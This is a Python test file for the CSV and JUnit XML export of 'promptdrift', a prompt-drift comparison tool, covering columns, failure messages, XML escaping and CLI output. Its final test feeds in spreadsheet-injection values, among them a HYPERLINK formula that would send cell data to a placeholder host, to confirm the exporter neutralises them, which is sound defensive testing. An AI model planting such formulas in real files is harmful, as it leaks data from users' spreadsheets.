"""Tests for CSV and JUnit XML export. No network, no API keys."""
import csv
import io
import json
import xml.etree.ElementTree as ET

from promptdrift import export as ex
from promptdrift.cli import main
from promptdrift.core import CaseResult, DiffReport
from promptdrift.export import (
    CSV_COLUMNS,
    OUTPUT_COLUMNS,
    failure_reason,
    save_csv,
    save_junit,
    to_csv,
    to_junit,
)
from promptdrift.offline import compare_outputs
from promptdrift.reporter import verdict_for

from .conftest import FakeProvider, verdict_json

RECORDS = [
    {"case_id": "same", "input": "q", "output_a": "Paris", "output_b": "Paris",
     "checks": {"regex": "Paris"}, "tags": ["qa", "short"]},
    {"case_id": "flip", "input": "15%", "output_a": "30", "output_b": "15% of 200 is 3.",
     "checks": {"regex": r"\b30\b"}},
    {"case_id": "multi\nline, \"quoted\"", "input": "<x>&</x>", "output_a": ["a b", "a c"],
     "output_b": ["x y", "x z"], "tags": ["edge"]},
]


def report(use_judge=False):
    # both orders: a "regressed" A-first reply and an "improved" B-first reply agree on regressed
    judge = FakeProvider([verdict_json("regressed", "worse <b>& bad</b>"),
                          verdict_json("improved", "worse <b>& bad</b>")] * 5)
    rep = compare_outputs([dict(r) for r in RECORDS], version_a="v1", version_b="v2",
                          bootstrap=30, seed=1, use_judge=use_judge, judge_provider=judge)
    rep.cases[1].latency_a, rep.cases[1].latency_b = 0.25, 0.75
    rep.cases[1].tokens_a, rep.cases[1].tokens_b = 7, 9
    return rep


def bare_case(**kw):
    base = dict(case_id="c", input="i", output_a="a", output_b="b", similarity=0.5,
                drift_score=0.5, drift_level="major")
    base.update(kw)
    return CaseResult(**base)


# ── CSV ───────────────────────────────────────────────────────────────────────
def test_csv_round_trip():
    rep = report()
    rows = list(csv.reader(io.StringIO(to_csv(rep))))
    assert rows[0] == CSV_COLUMNS
    assert len(rows) == 1 + len(RECORDS)
    by_id = {r[0]: dict(zip(rows[0], r)) for r in rows[1:]}
    same = by_id["same"]
    assert same["tags"] == "qa;short" and same["similarity"] == "1.0"
    assert same["drift_level"] == "none" and same["judge_verdict"] == ""
    assert same["check_flip"] == "" and same["format_changed"] == "false"
    assert same["json_valid_a"] == "false" and same["n_samples"] == "1"
    assert same["noise_floor"] == "" and same["similarity_method"] == "tfidf"
    flip = by_id["flip"]
    assert flip["check_flip"] == "pass_to_fail" and flip["drift_level"] == "regression"
    assert flip["latency_a"] == "0.25" and flip["tokens_b"] == "9"
    multi = by_id['multi\nline, "quoted"']
    assert multi["n_samples"] == "2" and multi["tags"] == "edge"
    assert float(multi["excess_drift"]) == float(multi["drift_score"]) - float(multi["noise_floor"])
    assert "output_a" not in rows[0]


def test_csv_include_outputs():
    rep = report()
    rows = list(csv.reader(io.StringIO(to_csv(rep, include_outputs=True))))
    assert rows[0] == CSV_COLUMNS + OUTPUT_COLUMNS
    by_id = {r[0]: dict(zip(rows[0], r)) for r in rows[1:]}
    assert by_id["flip"]["output_b"] == "15% of 200 is 3." and by_id["flip"]["input"] == "15%"
    assert by_id['multi\nline, "quoted"']["output_a"] == "a b"  # first sample
    assert by_id['multi\nline, "quoted"']["input"] == "<x>&</x>"


def test_csv_line_endings_and_save(tmp_path):
    text = to_csv(report())
    assert text.count("\r\n") == 1 + len(RECORDS)
    p = tmp_path / "out.csv"
    save_csv(report(), p, include_outputs=True)
    raw = p.read_bytes()
    assert b"\r\r\n" not in raw and raw.count(b"\r\n") >= 4
    assert len(list(csv.reader(io.StringIO(p.read_text(encoding="utf-8"))))) == 4


def test_csv_empty_report():
    rep = DiffReport(version_a="a", version_b="b", model_a="m", model_b="m", total_cases=0)
    assert to_csv(rep) == ",".join(CSV_COLUMNS) + "\r\n"


# ── JUnit ─────────────────────────────────────────────────────────────────────
def _parse(text):
    root = ET.fromstring(text)
    assert root.tag == "testsuites"
    suites = root.findall("testsuite")
    assert len(suites) == 1 and suites[0].get("name") == "promptdrift"
    return root, suites[0]


def _props(suite):
    return {p.get("name"): p.get("value") for p in suite.find("properties")}


def test_junit_counts_and_properties():
    rep = report()
    text = to_junit(rep)
    assert text.startswith('<?xml version="1.0" encoding="UTF-8"?>')
    root, suite = _parse(text)
    for el in (root, suite):
        assert el.get("tests") == "3" and el.get("failures") == "1" and el.get("errors") == "0"
        assert float(el.get("time")) == 1.0
    assert suite.get("skipped") == "0"
    props = _props(suite)
    status, reason = verdict_for(rep)
    assert props["verdict"] == "DO NOT SHIP" and props["verdict_status"] == status
    assert props["verdict_reason"] == reason
    assert float(props["avg_drift"]) == round(rep.avg_drift, 4)
    assert float(props["regression_rate"]) == round(rep.regression_rate, 4)
    ci = rep.confidence_intervals()
    assert [float(props["avg_drift_ci_low"]), float(props["avg_drift_ci_high"])] == ci["avg_drift"]
    assert "regression_rate_ci_low" in props and "avg_excess_drift_ci_high" in props
    assert props["ci_level"] == "0.95" and props["version_a"] == "v1"
    assert props["regressions"] == "1" and props["mode"] == "offline"


def test_junit_testcases_failures_and_system_out():
    rep = report()
    _, suite = _parse(to_junit(rep))
    cases = suite.findall("testcase")
    assert [c.get("name") for c in cases] == ["same", "flip", 'multi\nline, "quoted"']
    assert cases[0].get("classname") == "qa"            # first tag
    assert cases[1].get("classname") == "v1 vs v2"      # no tags
    assert cases[2].get("classname") == "edge"
    assert cases[0].find("failure") is None and cases[2].find("failure") is None
    fail = cases[1].find("failure")
    assert fail.get("type") == "regression"
    assert fail.get("message") == "check pass_to_fail (regex)"
    assert "output B:\n15% of 200 is 3." in fail.text
    assert cases[1].get("time") == "1.000"
    out = suite.find("system-out").text
    assert "flip: drift=" in out and "checks=pass_to_fail" in out
    assert "tags=qa,short" in out and "n=2 noise_floor=" in out
    assert suite.find("system-err") is not None


def test_junit_judge_reasons_and_errors():
    rep = report(use_judge=True)
    rep.cases[0].judge_verdict = "error"   # no drift, so the judge never ran; force an error
    text = to_junit(rep)
    assert "<b>" not in text and "&lt;b&gt;&amp; bad&lt;/b&gt;" in text
    root, suite = _parse(text)
    assert suite.get("failures") == "2" and suite.get("errors") == "1"
    cases = {c.get("name"): c for c in suite.findall("testcase")}
    err = cases["same"].find("error")
    assert err.get("type") == "judge_error" and "judge failed" in err.text
    msg = cases["flip"].find("failure").get("message")
    assert msg.startswith("judge regressed; check pass_to_fail (regex): worse")
    assert "judge=regressed" in suite.find("system-out").text


def test_junit_no_ci_when_bootstrap_disabled():
    rep = DiffReport(version_a="a", version_b="b", model_a="m", model_b="m", total_cases=1,
                     n_bootstrap=0, cases=[bare_case()])
    _, suite = _parse(to_junit(rep))
    props = _props(suite)
    assert "ci_level" not in props and "avg_drift_ci_low" not in props
    assert props["verdict"] == "REVIEW"
    assert suite.find("testcase").find("failure") is None


def test_junit_empty_report_and_save(tmp_path):
    rep = DiffReport(version_a="a", version_b="b", model_a="m", model_b="m", total_cases=0)
    p = tmp_path / "junit.xml"
    save_junit(rep, p)
    root, suite = _parse(p.read_text(encoding="utf-8"))
    assert suite.get("tests") == "0" and suite.findall("testcase") == []
    assert _props(suite)["verdict"] == "SAFE TO SHIP"


def test_failure_reason_variants():
    assert failure_reason(bare_case()) is None
    assert failure_reason(bare_case(drift_level="regression")) == "drift level regression"
    assert failure_reason(bare_case(judge_verdict="regressed")) == "judge regressed"
    assert failure_reason(bare_case(judge_verdict="regressed", judge_reasoning="why")) == \
        "judge regressed: why"
    assert failure_reason(bare_case(check_flip="pass_to_fail")) == "check pass_to_fail"
    c = bare_case(check_flip="pass_to_fail",
                  check_results_b=[{"type": "regex", "passed": False},
                                   {"type": "exact", "passed": True}, {"passed": False}])
    assert failure_reason(c) == "check pass_to_fail (regex, ?)"
    assert failure_reason(bare_case(check_flip="fail_to_pass")) is None


def test_cell_formatting():
    assert ex._cell(None) == "" and ex._cell(True) == "true" and ex._cell(False) == "false"
    assert ex._cell(0.5) == "0.5" and ex._cell("x") == "x"


# ── CLI ───────────────────────────────────────────────────────────────────────
def test_cli_compare_exports(tmp_path, monkeypatch, no_keys, capsys):
    """compare path: providers are patched, nothing is called over the network."""
    import importlib

    import yaml

    cmp = importlib.import_module("promptdrift.compare")
    fake = FakeProvider(["apple pie", "same text"])
    monkeypatch.setattr(cmp, "get_provider", lambda name, **kw: fake)
    cfg = {"version": "v1", "provider": "openai", "model": "m", "prompt_template": "{input}"}
    a, b, c = tmp_path / "a.yaml", tmp_path / "b.yaml", tmp_path / "cases.json"
    a.write_text(yaml.safe_dump(cfg))
    b.write_text(yaml.safe_dump(dict(cfg, version="v2")))
    c.write_text(json.dumps([{"id": "c1", "input": "x", "tags": ["t"]}, {"input": "y"}]))
    csv_p, junit_p, html_p = tmp_path / "o.csv", tmp_path / "o.xml", tmp_path / "o.html"
    main(["compare", str(a), str(b), "--cases", str(c), "--no-judge", "-q", "--json",
          "--bootstrap", "0", "--csv", str(csv_p), "--junit", str(junit_p), "--html", str(html_p)])
    rows = list(csv.DictReader(io.StringIO(csv_p.read_text(encoding="utf-8"))))
    assert [r["case_id"] for r in rows] == ["c1", "case_2"] and rows[0]["tags"] == "t"
    assert rows[0]["latency_a"] == "0.1" and rows[0]["tokens_a"] == "8"
    _, suite = _parse(junit_p.read_text(encoding="utf-8"))
    assert suite.findall("testcase")[0].get("classname") == "t"
    assert suite.findall("testcase")[1].get("classname") == "v1 vs v2"
    assert "<title>promptdrift: v1 vs v2</title>" in html_p.read_text(encoding="utf-8")
    captured = capsys.readouterr()
    # --json keeps stdout a single JSON document; the status lines go to stderr
    assert json.loads(captured.out)["version_b"] == "v2"
    assert "CSV saved" in captured.err and "CSV saved" not in captured.out


# ── review fixes: control characters, surrogates, spreadsheet formulas ────────
def test_junit_replaces_characters_xml_forbids():
    """ANSI colour codes, NUL, VT, FF and a lone surrogate used to make the file unparseable."""
    rep = compare_outputs([
        {"case_id": "c\x0b1", "input": "in \ud800 put", "output_a": "hello",
         "output_b": "broken \x00 \x1b[31mred\x1b[0m \x07 \x0c", "tags": ["t\x00ag"],
         "checks": {"regex": "hello"}},
        {"case_id": "ok", "output_a": "x", "output_b": "x"},
    ], version_a="v\x1b1", version_b="v2", bootstrap=0)
    assert rep.cases[0].check_flip == "pass_to_fail"
    xml = to_junit(rep)
    root = ET.fromstring(xml)  # parses
    tc = root.find("testsuite").findall("testcase")
    assert tc[0].get("name") == "c\\x0b1" and tc[0].get("classname") == "t\\x00ag"
    text = tc[0].find("failure").text
    assert "\\x1b[31mred\\x1b[0m" in text and "\\x00" in text and "\\x07" in text
    assert "in \\ud800 put" in text
    props = {p.get("name"): p.get("value") for p in root.iter("property")}
    assert props["version_a"] == "v\\x1b1"
    # tab, newline and carriage return are legal and stay as they are
    assert ex._xml_safe("a\tb\nc\rd�\U0001F600") == "a\tb\nc\rd�\U0001F600"
    assert ex._xml_safe("￾￿") == "\\ufffe\\uffff"


def test_save_junit_and_csv_survive_a_lone_surrogate(tmp_path):
    rep = compare_outputs([{"case_id": "s", "input": "q", "output_a": "Thanks!",
                            "output_b": "Thanks! \ud83d", "checks": {"regex": "^Thanks!$"}}],
                          bootstrap=0)
    save_junit(rep, tmp_path / "j.xml")
    ET.parse(tmp_path / "j.xml")
    save_csv(rep, tmp_path / "c.csv", include_outputs=True)
    rows = list(csv.DictReader(io.StringIO((tmp_path / "c.csv").read_text(encoding="utf-8"))))
    assert rows[0]["output_b"] == "Thanks! �"


def test_csv_neutralises_spreadsheet_formulas():
    rep = compare_outputs([
        {"case_id": '=HYPERLINK("https://example.invalid/?d="&A2,"open")', "input": "=1+1",
         "output_a": "+x", "output_b": "@SUM(1+1)", "tags": ["@SUM(1+1)"]},
        {"case_id": "-1", "output_a": "\tx", "output_b": "plain", "tags": ["ok"]},
        {"case_id": "normal", "output_a": "a", "output_b": "b"},
    ], bootstrap=0)
    rows = list(csv.DictReader(io.StringIO(to_csv(rep, include_outputs=True))))
    assert rows[0]["case_id"].startswith("'=HYPERLINK(")
    assert rows[0]["tags"] == "'@SUM(1+1)" and rows[0]["input"] == "'=1+1"
    assert rows[0]["output_a"] == "'+x" and rows[0]["output_b"] == "'@SUM(1+1)"
    assert rows[1]["case_id"] == "'-1" and rows[1]["output_a"] == "'\tx"
    assert rows[1]["tags"] == "ok" and rows[1]["output_b"] == "plain"
    assert rows[2]["case_id"] == "normal" and rows[2]["input"] == ""
    # numeric columns are never touched (negative latency deltas stay numbers)
    assert all(not r["drift_score"].startswith("'") for r in rows)
    raw = list(csv.DictReader(io.StringIO(to_csv(rep, include_outputs=True,
                                                 escape_formulas=False))))
    assert raw[0]["input"] == "=1+1" and raw[1]["case_id"] == "-1"
